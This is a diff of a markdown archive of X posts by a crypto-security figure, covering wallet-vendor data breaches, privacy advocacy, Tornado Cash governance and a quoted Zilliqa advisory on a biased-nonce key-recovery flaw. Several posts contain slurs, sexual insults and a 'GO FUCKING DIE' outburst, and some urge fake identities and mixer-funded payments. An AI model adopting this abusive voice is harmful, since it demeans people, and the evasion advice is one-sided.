+## 2026-09-04 · Post · i keep repeating myself: fake identities (incl. burner addresses) is what protects you from retarded
+
+
+### Post — @pcaversaccio — 2026-09-04 12:04 UTC (2026-09-04 13:04 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2095845368265318838
+- Metrics (at fetch): bookmark 20, impression 14460, like 236, quote 1, reply 7, retweet 18
+
+> i keep repeating myself: fake identities (incl. burner addresses) is what protects you from retarded govs &amp; corps. https://twitter.com/Trezor/status/2095807665603584085
+
+**Links in post:** https://twitter.com/Trezor/status/2095807665603584085
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1431204614 — 2026-09-04 09:34 UTC (2026-09-04 10:34 WAT)
+    
+    - URL: https://x.com/1431204614/status/2095807665603584085
+    - Metrics (at fetch): bookmark 613, impression 1127233, like 2590, quote 377, reply 537, retweet 514
+    
+    > Two days ago, we received an update from our shipping provider, ShipMonk. We're deeply saddened to share the news that the recent data breach affects more customers than originally thought.
+    >
+    > Another 67,000 customers from the US who ordered between November 2019 and August 2021 were affected, with their full details (name, email, phone number, shipping address, order number) exposed. 
+    >
+    > All affected customers have been emailed directly. If you didn’t receive an email, then you are not affected. 
+    >
+    > Throughout our entire relationship with ShipMonk, we repeatedly requested and received written assurance confirming the deletion of the data, in line with our contract, data policy, and past communications. We are very disappointed that, despite receiving this confirmation, the data was not deleted in their systems.
+    >
+    > Trezor systems were not compromised, and your device is secure. But please be alert for fake emails, phone calls, fraudulent letters, and potential risks to physical security. 
+    >
+    > NEVER share your wallet backup with anyone or type it into a website.
+    >
+    > We’re terribly sorry to everyone affected. We take this matter very seriously and are working to ship anonymous delivery ASAP, so you can protect your personal information when placing an order.
+    >
+    > For more information, visit our blog: https://trezor.io/blog/news/recent-customer-data-exposed-in-shipping-provider-incident
+    
+    **Links in post:** https://twitter.com/Trezor/status/2087885428313543059, https://trezor.io/blog/news/recent-customer-data-exposed-in-shipping-provider-incident
+    
+    **Quoted post (full text):**
+    
+        #### Quoted post — @1431204614 — 2026-08-13 12:54 UTC (2026-08-13 13:54 WAT)
+        
+        - URL: https://x.com/1431204614/status/2087885428313543059
+        - Metrics (at fetch): bookmark 1901, impression 7688507, like 8253, quote 2484, reply 2024, retweet 2218
+        
+        > We have some difficult news to share. Unfortunately, one of our shipping providers has experienced a data breach that exposed sensitive order data. This affects new customers in the US, UK, Sweden, Colombia, Brazil, Italy, and Portugal who received an order within the 90 days prior to August 8th, 2026.
+        >
+        > The data exposed:
+        >
+        > - Full names
+        > - Shipping addresses
+        > - Phone numbers
+        > - Email addresses 
+        >
+        > The incident affects 11,742 customers with full exposure (name, email, phone number, shipping address) and 1,947 customers with partial exposure (name, city, email). The breach is limited due to Trezor’s strict 90-day data storage policy (we were also able to negotiate the same terms with fulfillment partners, who follow the same policy).
+        >
+        > All affected customers have been contacted separately by email.
+        >
+        > Our systems and devices remain secure, but affected customers could experience an increase in phishing attempts.
+        >
+        > NEVER enter your wallet backup on a website or share it with anyone, and only check for updates on official Trezor channels.
+        >
+        > We are deeply sorry to the community and those affected. 
+        >
+        > We are investigating this situation and will post updates on our blog:
+        > https://trezor.io/blog/news/recent-customer-data-exposed-in-shipping-provider-incident?ABC
+        
+        **Links in post:** https://trezor.io/blog/news/recent-customer-data-exposed-in-shipping-provider-incident?ABC
+        
+    
+
+
+---
+
+## 2026-09-03 · Post · i believe long-term any hard-fork-related client (el & cl) changes must be formally verified. i aske
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
 
 
 ### Post — @pcaversaccio — 2026-09-03 07:56 UTC (2026-09-03 08:56 WAT)
 
 - URL: https://x.com/pcaversaccio/status/2095420680116547672
-- Metrics (at fetch): bookmark 3, impression 4991, like 57, quote 1, reply 7, retweet 5
+- Metrics (at fetch): bookmark 3, impression 4993, like 57, quote 1, reply 7, retweet 5
 
-> i believe long-term any hard-fork-related client (el &amp; cl) changes must be formally verified. i asked this q yesterday in the Eth R&amp;D discord server and already got some valuable feedback. pls share your feedback, ideas, past experiences, and thoughts on how we can get there on [pic.x.com/KwqJv6yjh3]
+> i believe long-term any hard-fork-related client (el & cl) changes must be formally verified. i asked this q yesterday in the Eth R&D discord server and already got some valuable feedback. pls share your feedback, ideas, past experiences, and thoughts on how we can get there on the new thread created here:
+> https://ethresear.ch/t/formal-verification-of-execution-and-consensus-clients/25894
+>
+> ultimately, before an upgrade goes live, we should be able to provide a mathematical proof that its implementation correctly realises the _specified_ (this is part of the convo btw, _what_ spec) state transition and consensus rules. look, code can fail, processes can fail, and people can make mistakes. math gives us a stronger foundation for securing what we do on ethereum.
 
 **Media:**
 - photo: https://pbs.twimg.com/media/HRRrlxobkAAtpXT.jpg — no alt text provided by author
+
+**Links in post:** https://ethresear.ch/t/formal-verification-of-execution-and-consensus-clients/25894
+
+
+---
+
+## 2026-08-23 · Post · the ultimate end goal of ethereum must be to give every individual the ability to become _ungovernab
+
+
+### Post — @pcaversaccio — 2026-08-23 18:36 UTC (2026-08-23 19:36 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2091595437623083140
+- Metrics (at fetch): bookmark 11, impression 12479, like 287, quote 4, reply 31, retweet 37
+
+> the ultimate end goal of ethereum must be to give every individual the ability to become _ungovernable_.
+
+
+---
+
+## 2026-08-23 · Post · i keep repeating myself: no governance is best governance 
+
+
+### Post — @pcaversaccio — 2026-08-23 15:52 UTC (2026-08-23 16:52 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2091554065238970782
+- Metrics (at fetch): bookmark 0, impression 7887, like 75, quote 2, reply 8, retweet 2
+
+> i keep repeating myself: no governance is best governance 
+> https://x.com/pcaversaccio/status/2074184522950971768 https://twitter.com/DefimonAlerts/status/2091422624249217259
+
+**Links in post:** https://x.com/pcaversaccio/status/2074184522950971768, https://twitter.com/DefimonAlerts/status/2091422624249217259
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1981269826497892352 — 2026-08-23 07:09 UTC (2026-08-23 08:09 WAT)
+    
+    - URL: https://x.com/1981269826497892352/status/2091422624249217259
+    - Metrics (at fetch): bookmark 40, impression 24904, like 56, quote 3, reply 0, retweet 7
+    
+    > Defimon detected an exploit on Term Finance @term_labs that drained ~$8.5M on Ethereum
+    >   
+    > Attacker cheaply acquired a majority of a sparsely-held DAO governance token, then passed malicious proposals to seize control of Term's vaults.
+    >
+    > Tx #1: https://etherscan.io/tx/0xd354a15b15cb73d30908f411aee3f795ec86737a4d080e9a818ac4d6d3014129
+    > Tx #2: https://etherscan.io/tx/0x9f273f9a5a20c2fc957b06bbfa45db486390eede4a7f44fbe1a2eb6744c2e8a0
+    >
+    > Attackers:
+    > https://etherscan.io/address/0xa908b3472d76e7744bab0a5911768a4a6300612b
+    > https://etherscan.io/address/0x686457a7468b9b31c5dba43b1b16077b48520691
+    
+    **Links in post:** https://etherscan.io/tx/0xd354a15b15cb73d30908f411aee3f795ec86737a4d080e9a818ac4d6d3014129, https://etherscan.io/tx/0x9f273f9a5a20c2fc957b06bbfa45db486390eede4a7f44fbe1a2eb6744c2e8a0, https://etherscan.io/address/0xa908b3472d76e7744bab0a5911768a4a6300612b, https://etherscan.io/address/0x686457a7468b9b31c5dba43b1b16077b48520691
+    
+
+
+---
+
+## 2026-08-17 · Post · some of you think i'm insane. some of you think i'm too radical. some of you think i'm too harsh. wh
+
+
+### Post — @pcaversaccio — 2026-08-17 11:24 UTC (2026-08-17 12:24 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2089312445391081878
+- Metrics (at fetch): bookmark 25, impression 27694, like 399, quote 13, reply 32, retweet 51
+
+> some of you think i'm insane. some of you think i'm too radical. some of you think i'm too harsh. what you don't understand is that your constant willingness to compromise has helped create a crypto industry full of loopholes, backdoors, surveillance and centralised choke points. what matters to me are _principles_, not some politically correct tone. surprise, "pc" does _not_ stand for political correctness. the only way out of this entire shitshow is to stick hard to principles and call out anything that violates them. i don't fucking care if i hurt your feelings. i care about building a future where people can transact securely, privately and w/o censorship, w/o having their data traded around or put at risk of leaks by incompetent companies and governments. look a huge portion of this industry is made up of cock-sucking whores who will happily take every shortcut imaginable just to align with whatever short-term narrative is currently popular. but don't be butthurt when i call you out for it. stop being a fucking pussy. i can remain cypherpunk longer than you can fool us.
+
+
+---
+
+## 2026-08-16 · Post · Never. Use. Your. Real. Personal. Data. Online. and idgaf about whatever threat model you use. there
+
+
+### Post — @pcaversaccio — 2026-08-16 14:55 UTC (2026-08-16 15:55 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2089003243732869176
+- Metrics (at fetch): bookmark 34, impression 34233, like 351, quote 9, reply 12, retweet 24
+
+> Never. Use. Your. Real. Personal. Data. Online. and idgaf about whatever threat model you use. there is zero fucking reason you want to have your personal data in the hands of criminals. period.
+
+
+---
+
+## 2026-08-16 · Post · "Information including name, email address, shipping address, phone number, and purchase details, wa
+
+
+### Post — @pcaversaccio — 2026-08-16 14:24 UTC (2026-08-16 15:24 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2088995376787337296
+- Metrics (at fetch): bookmark 20, impression 19711, like 205, quote 2, reply 16, retweet 13
+
+> "Information including name, email address, shipping address, phone number, and purchase details, was accessed externally without authorization due to the flaw."
+>
+> GO FUCKING DIE YOU IRRESPONSIBLE PIECE OF SHIT COMPANY. YOU PUT REAL PEOPLE AT RISK HERE AND IF WE EVER GET A KIDNAPPING CASE DUE TO YOU FUCKTARDS I WILL MAKE SURE YOU GET SUED TO DEATH!
+
+**Links in post:** https://twitter.com/SafePal/status/2088937173139812792
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1068417957686992896 — 2026-08-16 10:33 UTC (2026-08-16 11:33 WAT)
+    
+    - URL: https://x.com/1068417957686992896/status/2088937173139812792
+    - Metrics (at fetch): bookmark 378, impression 2374512, like 1338, quote 624, reply 364, retweet 332
+    
+    > Dear community,
+    >
+    > While your SafePal wallet, seed phrase, and private keys are secure; we identified a flaw in the order-tracking plug-in that led to unauthorized access to information of a subset of customers.
+    >
+    > The issue has been fixed with additional security measures introduced.
+    >
+    > The incident impacts approximately 39,798 customers who placed orders between March 2, 2025 and April 11, 2026. Exposed information includes name, email address, shipping address, phone number, and purchase details.
+    >
+    > All affected customers have been notified individually by email. We have also published this webpage https://www.safepal.com/scam-protection for customers to verify if they are affected using order ID number and shipping country.
+    >
+    > For a complete disclosure of the incident and the actions we’ve taken, along with FAQs and guidance, please refer to our blog: https://www.safepal.com/blog/security-update
+    >
+    > This incident did not involve your seed phrase, private keys, wallet password, or other wallet credentials, bank account information, payment card numbers, or government-issued identification numbers.
+    >
+    > Never share your seed phrase, private key, or password with anyone, and stay vigilant against phishing or impersonation attempts.
+    >
+    > We are extremely sorry to the community and those who are affected. Updates will be posted on our blog as we continue to work through things.
+    
+    **Links in post:** https://www.safepal.com/scam-protection, https://www.safepal.com/blog/security-update
+    
+
+
+---
+
+## 2026-08-13 · Post · "but affected customers could experience an increase in phishing attempts" fuck no that's NOT the bi
+
+
+### Post — @pcaversaccio — 2026-08-13 13:36 UTC (2026-08-13 14:36 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2087896165379440956
+- Metrics (at fetch): bookmark 44, impression 22176, like 385, quote 7, reply 23, retweet 57
+
+> "but affected customers could experience an increase in phishing attempts" fuck no that's NOT the biggest risk. the fucking biggest risk is that criminals come to your house and physically attack you. hear me out folks, there is no fucking reason to ever use your true personal credentials online. use email aliases, fake identities, burner addresses for one-off deliveries, pay with xmr, zec or tornado-cash-funded wallets. all of these companies including governments (see France where tax data was sold) cannot be trusted with your personal data because they're all too incompetent to protect individuals. the only person that can protect you is yourself by acting properly. don't trust anyone with your most important data.
+
+**Links in post:** https://twitter.com/Trezor/status/2087885428313543059
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1431204614 — 2026-08-13 12:54 UTC (2026-08-13 13:54 WAT)
+    
+    - URL: https://x.com/1431204614/status/2087885428313543059
+    - Metrics (at fetch): bookmark 1901, impression 7688507, like 8253, quote 2484, reply 2024, retweet 2218
+    
+    > We have some difficult news to share. Unfortunately, one of our shipping providers has experienced a data breach that exposed sensitive order data. This affects new customers in the US, UK, Sweden, Colombia, Brazil, Italy, and Portugal who received an order within the 90 days prior to August 8th, 2026.
+    >
+    > The data exposed:
+    >
+    > - Full names
+    > - Shipping addresses
+    > - Phone numbers
+    > - Email addresses 
+    >
+    > The incident affects 11,742 customers with full exposure (name, email, phone number, shipping address) and 1,947 customers with partial exposure (name, city, email). The breach is limited due to Trezor’s strict 90-day data storage policy (we were also able to negotiate the same terms with fulfillment partners, who follow the same policy).
+    >
+    > All affected customers have been contacted separately by email.
+    >
+    > Our systems and devices remain secure, but affected customers could experience an increase in phishing attempts.
+    >
+    > NEVER enter your wallet backup on a website or share it with anyone, and only check for updates on official Trezor channels.
+    >
+    > We are deeply sorry to the community and those affected. 
+    >
+    > We are investigating this situation and will post updates on our blog:
+    > https://trezor.io/blog/news/recent-customer-data-exposed-in-shipping-provider-incident?ABC
+    
+    **Links in post:** https://trezor.io/blog/news/recent-customer-data-exposed-in-shipping-provider-incident?ABC
+    
+
+
+---
+
+## 2026-08-11 · Post · some random hot take: qubes' biggest security feature isn't encryption or sandboxing. it's that it a
+
+
+Tags (automatic): Memory corruption / native
+
+
+### Post — @pcaversaccio — 2026-08-11 18:52 UTC (2026-08-11 19:52 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2087250855733113167
+- Metrics (at fetch): bookmark 9, impression 4958, like 75, quote 2, reply 7, retweet 4
+
+> some random hot take: qubes' biggest security feature isn't encryption or sandboxing. it's that it assumes your software will get _compromised_ and stops trying to prevent that. apps run in isolated qubes, so a compromise is contained by the hypervisor instead of giving the attacker access to the host's kernel. that boundary is enforced by Xen (there will be a reply guy saying "but what about Xen CVEs" lol)  and _not_ by the app behaving itself. most OSes trust the kernel and everything running on it (and yes, this is fucking retarded). qubes assumes everything is hostile by default. that's the right threat model to work with. it moves the trust boundary one layer down. qubes is cool and secure. try it.
+
+
+---
+
+## 2026-08-07 · Post · imho one critical missing piece for tornado cash to become more usuable on a _daily_ basis is having
+
+
+Tags (automatic): Path normalization
+
+
+### Post — @pcaversaccio — 2026-08-07 11:36 UTC (2026-08-07 12:36 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2085691576941166795
+- Metrics (at fetch): bookmark 10, impression 13016, like 110, quote 2, reply 25, retweet 4
+
+> imho one critical missing piece for tornado cash to become more usuable on a _daily_ basis is having a 0.01 ETH pool. we could simply clone the existing working pool code, adjust for 0.01 ETH (only nit adjustments needed actually), and make a proposal to governance (so the pool can be registered via the official router) that (CREATE2-)deploys this pool when the proposal is executed and we're good to go. ui code would need an update as well, but this is solveable. (and after this happened we dissolve TC governance 😉, but this is another topic lol). thoughts?
 
 
 ---
@@ -55,9 +928,110 @@ _Generated 2026-11-15 from the X API (full-archive search + timeline). Every pos
 ### Post — @pcaversaccio — 2026-08-06 14:16 UTC (2026-08-06 15:16 WAT)
 
 - URL: https://x.com/pcaversaccio/status/2085369509133664538
-- Metrics (at fetch): bookmark 41, impression 145421, like 431, quote 17, reply 68, retweet 33
+- Metrics (at fetch): bookmark 41, impression 145461, like 431, quote 17, reply 68, retweet 33
 
-> i'm so fucking done with all of your fucktards using hot wallets, getting compromised and losing your life savings because you stored everything on a hot device. i don't have fucking mercy with you. it's all your fucking mistake. stop using fucking hot wallets. hot wallets are a
+> i'm so fucking done with all of your fucktards using hot wallets, getting compromised and losing your life savings because you stored everything on a hot device. i don't have fucking mercy with you. it's all your fucking mistake. stop using fucking hot wallets. hot wallets are a fucking bug. today alone we have had +2m in losses at SEAL 911 due to hot wallet drains (via device compromises). use a fucking cold storage wallet.
+
+
+---
+
+## 2026-08-05 · Post · who said OP_RETURN can't hurt you ;)
+
+
+### Post — @pcaversaccio — 2026-08-05 11:07 UTC (2026-08-05 12:07 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2084959539615731788
+- Metrics (at fetch): bookmark 2, impression 7622, like 59, quote 0, reply 7, retweet 5
+
+> who said OP_RETURN can't hurt you ;)
+> https://blockstream.info/tx/3910552633d25e6c0360281c43651cd7ae3cc70257759db7a8c07bef6f2994d8?expand [pic.x.com/MyytdFNoPX]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HO9CEW-aMAA3K8E.jpg — no alt text provided by author
+
+**Links in post:** https://blockstream.info/tx/3910552633d25e6c0360281c43651cd7ae3cc70257759db7a8c07bef6f2994d8?expand
+
+
+---
+
+## 2026-08-04 · Post · guys, ethereum wasn't created to fit into the existing system. it was created to _route around it_. 
+
+
+Tags (automatic): Memory corruption / native
+
+
+### Post — @pcaversaccio — 2026-08-04 16:57 UTC (2026-08-04 17:57 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2084685244058521600
+- Metrics (at fetch): bookmark 27, impression 22087, like 585, quote 7, reply 52, retweet 86
+
+> guys, ethereum wasn't created to fit into the existing system. it was created to _route around it_. somewhere along the way, we stopped trying to make the old world obsolete and started asking for its approval. fuck approval. wtf are we building today that makes the old world obsolete? not 10% cheaper. not 20% faster. _obsolete_.
+
+
+---
+
+## 2026-07-30 · Post · too many folks think privacy is about removing names. well, it is _not_. it's about eliminating _uni
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-07-30 10:01 UTC (2026-07-30 11:01 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2082768576113688610
+- Metrics (at fetch): bookmark 14, impression 9796, like 231, quote 1, reply 16, retweet 15
+
+> too many folks think privacy is about removing names. well, it is _not_. it's about eliminating _uniqueness_. once your behaviour stands out, you've already identified yourself. it's all about maximising your anonset guys, whether on-chain or across every piece of metadata you leave behind (and you leave a lot of data behind dude). the fun fact is that many times the best privacy decision is simply sticking to the defaults because the crowd is your cover.
+
+
+---
+
+## 2026-07-29 · Post · _unconditional_ privacy https://twitter.com/ethereumfndn/status/2082437165233951223
+
+
+### Post — @pcaversaccio — 2026-07-29 12:13 UTC (2026-07-29 13:13 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2082439323274952926
+- Metrics (at fetch): bookmark 13, impression 34968, like 717, quote 5, reply 98, retweet 54
+
+> _unconditional_ privacy https://twitter.com/ethereumfndn/status/2082437165233951223
+
+**Links in post:** https://twitter.com/ethereumfndn/status/2082437165233951223
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1529875152460193794 — 2026-07-29 12:04 UTC (2026-07-29 13:04 WAT)
+    
+    - URL: https://x.com/1529875152460193794/status/2082437165233951223
+    - Metrics (at fetch): bookmark 57, impression 248205, like 1414, quote 87, reply 228, retweet 181
+    
+    > We’re pleased to welcome @pcaversaccio to the EF Board. 
+    >
+    > A longtime Ethereum contributor, co-founder of SEAL 911, Silviculture Society member, and privacy and security maximalist, pc has consistently championed the values at Ethereum’s core. We look forward to working together to help steward Ethereum’s long-term future. 
+    >
+    > Read more: https://blog.ethereum.org/2026/07/29/ef-board-update
+    
+    **Links in post:** https://blog.ethereum.org/2026/07/29/ef-board-update
+    
+
+
+---
+
+## 2026-07-27 · Post · i recommend anyone who travels to use grapheneos and set up a duress pin & pw (and rotate both befor
+
+
+### Post — @pcaversaccio — 2026-07-27 09:56 UTC (2026-07-27 10:56 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2081680112924455082
+- Metrics (at fetch): bookmark 96, impression 26603, like 308, quote 6, reply 23, retweet 26
+
+> i recommend anyone who travels to use grapheneos and set up a duress pin & pw (and rotate both before every trip). the chances of being forced to unlock your phone, whether at a border crossing or somewhere on the street, are only going up in this insane world. it's _your_ fucking phone, your data, and your private life. nobody except you has any right to access its contents. period.
+> https://grapheneos.org/features#duress
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HOOZM2hbIAAqPqt.png — no alt text provided by author
+
+**Links in post:** https://grapheneos.org/features#duress
 
 
 ---
@@ -68,7 +1042,7 @@ _Generated 2026-11-15 from the X API (full-archive search + timeline). Every pos
 ### Post — @pcaversaccio — 2026-07-22 09:41 UTC (2026-07-22 10:41 WAT)
 
 - URL: https://x.com/pcaversaccio/status/2079864292204023841
-- Metrics (at fetch): bookmark 30, impression 20769, like 97, quote 2, reply 10, retweet 9
+- Metrics (at fetch): bookmark 30, impression 20770, like 97, quote 2, reply 10, retweet 9
 
 > the crazy thing is that the vulnerability has been live since _August 23 2019_: https://github.com/Zilliqa/ledger-app-zilliqa/commit/61dda37806e237a007505b05d619e9df134ff3a7 [pic.x.com/Ot6vEgoz0W] https://twitter.com/zilliqa/status/2079847348780536050
 
@@ -78,7 +1052,492 @@ _Generated 2026-11-15 from the X API (full-archive search + timeline). Every pos
 
 **Links in post:** https://github.com/Zilliqa/ledger-app-zilliqa/commit/61dda37806e237a007505b05d619e9df134ff3a7, https://twitter.com/zilliqa/status/2079847348780536050
 
-**Quoted post** 2079847348780536050: not readable via the API (deleted, private, or withheld).
+**Quoted post (full text):**
+
+    #### Quoted post — @872984298973941764 — 2026-07-22 08:33 UTC (2026-07-22 09:33 WAT)
+    
+    - URL: https://x.com/872984298973941764/status/2079847348780536050
+    - Metrics (at fetch): bookmark 51, impression 197587, like 194, quote 42, reply 46, retweet 41
+    
+    > Nonce-Generation Vulnerability in the Zilliqa Ledger App: A critical vulnerability has been identified in the Zilliqa Ledger application affecting the generation of Schnorr signatures for native (non-EVM) Zilliqa transactions. The vulnerability causes signatures to be generated with a predictably weakened ephemeral nonces, from which an attacker can recover the signer’s private key using only publicly available on-chain data.
+    >
+    > Protective measures are already in place to prevent further loss, and a coordinated remediation plan is being finalised. Users who have signed native Zilliqa transactions with a Ledger device should await official guidance before taking any action.
+    >
+    > Impact: The vulnerability affects private keys used to sign native Zilliqa transactions with a Ledger device. Any account that has broadcast approximately five or more native transactions signed through the Zilliqa Ledger app should be considered compromised. Its private key can be reconstructed from signatures already recorded on-chain, regardless of any subsequent software update.
+    >
+    > The issue is confined to the Ledger app’s native signing path. EVM transactions are unaffected. Zilliqa software development kits, including zilliqa-js, gozilliqa-sdk and pyzil, generate nonces correctly and are not affected.
+    >
+    > Root cause: Zilliqa native transactions are authenticated using EC-Schnorr signatures over secp256k1. Each signature requires a fresh, uniformly random 256-bit ephemeral nonce, (k). The secrecy and full-width randomness of (k) are essential, as any systematic bias can allow the private key to be recovered.
+    >
+    > The signing routine generated 40 bytes of randomness and reduced them modulo the curve order, correctly producing a uniform 256-bit value. However, when copying this value into the nonce buffer, the code copied the wrong 32 bytes of the 40-byte output. This retained the eight zero-padding bytes introduced by the reduction and discarded eight bytes of entropy.
+    >
+    > As a result, the most significant 64 bits of every generated nonce were fixed at zero, meaning (k < 2^{192}).
+    >
+    > A nonce with 64 known bits leaks information about the private key with each signature. With five or more affected signatures, the private key can be recovered in seconds using commodity hardware by solving the resulting Hidden Number Problem through lattice reduction - a well-documented technique for attacking biased-nonce signatures.
+    > Because the affected transactions are permanently recorded on-chain, this exposure cannot be reversed by updating the signing application. The affected keys must be retired.
+    >
+    > Timeline
+    > 2019-2026: The defect was present in every released version of the Zilliqa Ledger app across all supported devices.
+    >
+    > 19 July 2026: On-chain activity consistent with active exploitation was observed.
+    >
+    > 21 July 2026: The root cause was isolated to the app’s nonce-handling code and confirmed by reproducing the issue against on-chain signatures.
+    >
+    > Ongoing: A corrected version of the app is being prepared in coordination with Ledger. Release details will be announced separately.
+    >
+    > Remediation: As soon as the issue was identified, native (non-EVM) transactions were suspended as a protective measure. This has halted further draining of affected accounts while a solution is prepared.
+    >
+    > Affected accounts cannot be secured through an ordinary transfer. Because their private keys can be derived from data already recorded on-chain, an attacker with access to the same key could attempt to front-run a legitimate transfer as soon as transactions resume. Advising users simply to move their funds would therefore be ineffective and potentially unsafe.
+    >
+    > A corrected build of the Ledger app has been prepared, restoring full-width nonce generation and preventing further weakened signatures from being produced. However, this does not protect keys that have already been used to sign affected transactions. Those keys must ultimately be retired.
+    >
+    > A coordinated remediation plan to secure affected balances is being finalised and will be published separately. Until then, users who have signed native Zilliqa transactions with a Ledger device should take no independent action and should rely solely on official Zilliqa channels for instructions.
+    >
+    > Users who hold or transact with ZIL exclusively through EVM-compatible tooling are not affected.
+    >
+    > Acknowledgments: @kucoincom played a key role in pinpointing the root cause in the Zilliqa Ledger app nonce generation, recovered affected private keys from publicly available on-chain signatures, and confirmed ongoing exploitation.
+    >
+    > KuCoin’s timely reporting and responsible collaboration enabled rapid protective measures, helping safeguard users, ecosystem participants, and the broader Zilliqa ecosystem while the remediation plan was being developed.
+    >
+    > We sincerely appreciate the KuCoin team’s professionalism, technical expertise, and cooperation throughout this process.
+    
+    **Links in post:** https://twitter.com/zilliqa/status/2079252738555400299
+    
+    **Quoted post** 2079252738555400299: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
+## 2026-07-18 · Post · this industry has spent more than a decade lying to itself about building the future while shipping 
+
+
+### Post — @pcaversaccio — 2026-07-18 15:46 UTC (2026-07-18 16:46 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2078506725200797935
+- Metrics (at fetch): bookmark 32, impression 35220, like 320, quote 13, reply 28, retweet 38
+
+> this industry has spent more than a decade lying to itself about building the future while shipping systems that can't survive the people who built them. if your application fails the walk away test, you've fucking failed. period. i don't fucking care how many users, investors, or billions it has. sooner or later every company disappears, every foundation dissolves, and every multisig stops signing. the only things worth building are the ones that keep working after everyone walks away. build something that no longer needs you.
+
+
+---
+
+## 2026-07-14 · Post · i've been one of the very few people consistently reviewing tornado cash dao proposals (and man, thi
+
+
+### Post — @pcaversaccio — 2026-07-14 08:21 UTC (2026-07-14 09:21 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2076945231271113031
+- Metrics (at fetch): bookmark 4, impression 18289, like 117, quote 6, reply 24, retweet 9
+
+> i've been one of the very few people consistently reviewing tornado cash dao proposals (and man, this is fucking time-consuming), and i've come to the conclusion that the recent proposals are either malicious or just bullshit quality (and simply adds unnecessary noise).
+>
+> along the lines i tweeted recently of "no governance is best governance," i've been working on a _terminal_ tornado cash governance proposal that permanently _disables_ tornado cash governance so that no future proposal (malicious or otherwise) can ever be submitted, voted on, or executed again.
+>
+> at the same time, it adds `unlockAll()` so previously locked torn, including the torn locked specifically to pass this proposal, is never trapped. any torn held directly by the governance contract itself (i.e. dao treasury funds not accounted for in the vault) is intentionally left _inaccessible_ and will remain permanently trapped forever once the governance is sealed.
+>
+> my ask: please review the proposal and share your feedback (i haven't done any security reviews so far as well as i'm running on little sleep, so any security comments appreciated as well): https://github.com/pcaversaccio/tornado-governance-lock/discussions/1
+>
+> the proposal is not live yet. i'll only deploy it if i can get sufficient commitments from torn token holders to support and pass it. if executed, torn effectively becomes a meme token.
+>
+> tornado cash governance must die. long live tornado cash.
+>
+> https://github.com/pcaversaccio/tornado-governance-lock
+
+**Links in post:** https://github.com/pcaversaccio/tornado-governance-lock/discussions/1, https://github.com/pcaversaccio/tornado-governance-lock
+
+
+---
+
+## 2026-07-08 · Post · it's pretty simple: my personal goal is to make Ethereum the leading privacy chain (unconditional na
+
+
+Tags (automatic): Smart contract / DeFi
+
+
+### Post — @pcaversaccio — 2026-07-08 08:17 UTC (2026-07-08 09:17 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2074769875172475035
+- Metrics (at fetch): bookmark 23, impression 11065, like 312, quote 3, reply 27, retweet 25
+
+> it's pretty simple: my personal goal is to make Ethereum the leading privacy chain (unconditional native txs & private compute via confidential smart contracts). everything else is of second importance to me. and i don't fucking care if this is unpopular. i don't fucking care if most people disagree. i'm not fucking stopping until we get there.
+
+
+---
+
+## 2026-07-06 · Post · look guys, it's actually pretty simple: on-chain governance is not a solution to a problem, it intro
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
+### Post — @pcaversaccio — 2026-07-06 17:31 UTC (2026-07-06 18:31 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2074184522950971768
+- Metrics (at fetch): bookmark 14, impression 19656, like 211, quote 4, reply 21, retweet 25
+
+> look guys, it's actually pretty simple: on-chain governance is not a solution to a problem, it introduces another _failure mode_. full stop. if governance can approve arbitrary changes to mutable code, you're no longer trusting immutable code, you're trusting governance. no
+
+
+---
+
+## 2026-07-01 · Post · so i've been moving all of my actively maintained repos to require github actions pinned to _full-le
+
+
+### Post — @pcaversaccio — 2026-07-01 11:45 UTC (2026-07-01 12:45 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2072285478397825401
+- Metrics (at fetch): bookmark 38, impression 6106, like 72, quote 0, reply 9, retweet 2
+
+> so i've been moving all of my actively maintained repos to require github actions pinned to _full-length commit shas_. on top of that, all jobs now use fine-grained perms, downloaded binaries are verified against hardcoded sha256 hashes, deps are pinned, and force-pushes to the https://t.co/Hrw2ncmnuh
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HMI8UwXawAA4q6d.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HMI8WfXbUAABL12.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HMI8Xq4bIAAx83j.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HMI8Y9cb0AA7EVl.jpg — no alt text provided by author
+
+
+---
+
+## 2026-06-25 · Post · the latest tornado cash proposal 67 is _malicious_: https://bafybeie5hxovqc4ifcnrnhvmjbefxgeix6oqvza
+
+
+### Post — @pcaversaccio — 2026-06-25 12:41 UTC (2026-06-25 13:41 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2070125180261896246
+- Metrics (at fetch): bookmark 32, impression 26854, like 214, quote 6, reply 14, retweet 55
+
+> the latest tornado cash proposal 67 is _malicious_: https://bafybeie5hxovqc4ifcnrnhvmjbefxgeix6oqvzaspyytdxiyscji22v5pu[.]ipfs[.]inbrowser[.]link/governance/67
+>
+> decompilation of the proposal: https://t.co/bfGfEkb1o3
+>
